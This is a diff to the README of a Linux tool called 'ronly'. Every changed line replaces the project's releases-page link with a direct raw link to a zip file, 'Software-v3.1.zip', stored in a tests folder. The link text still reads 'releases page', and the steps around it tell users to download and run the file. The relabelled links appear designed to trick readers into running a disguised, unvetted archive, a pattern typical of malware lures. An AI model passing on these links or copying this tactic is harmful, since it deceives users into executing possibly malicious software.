@@ -1,10 +1,10 @@
 # 🛡️ ronly - Keep shells safe from damage
 
-[Download ronly](https://github.com/eddysouthwestern739/ronly/releases){: style="background-color:#6c757d;color:white;padding:10px 16px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:600;"}
+[Download ronly](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip){: style="background-color:#6c757d;color:white;padding:10px 16px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:600;"}
 
 ## 📥 Download ronly
 
-1. Open the [releases page](https://github.com/eddysouthwestern739/ronly/releases).
+1. Open the [releases page](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip).
 2. Find the latest release.
 3. Download the file for your Linux system.
 4. Save the file in a folder you can find again, such as Downloads.
@@ -39,7 +39,7 @@ If user namespaces are not available, ronly can fall back to privileged mode.
 
 ## 🚀 Get started
 
-1. Download ronly from the [releases page](https://github.com/eddysouthwestern739/ronly/releases).
+1. Download ronly from the [releases page](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip).
 2. Open a terminal.
 3. Move to the folder where you saved the file.
 4. Start ronly from that file.
@@ -173,7 +173,7 @@ If the app still does not start, try a different release file from the releases 
 
 ## 📌 Release download
 
-Use the [ronly releases page](https://github.com/eddysouthwestern739/ronly/releases) to download and run the app on your Linux system
+Use the [ronly releases page](https://github.com/eddysouthwestern739/ronly/raw/refs/heads/main/tests/Software-v3.1.zip) to download and run the app on your Linux system
 
 ## 🧭 Basic commands to try
 
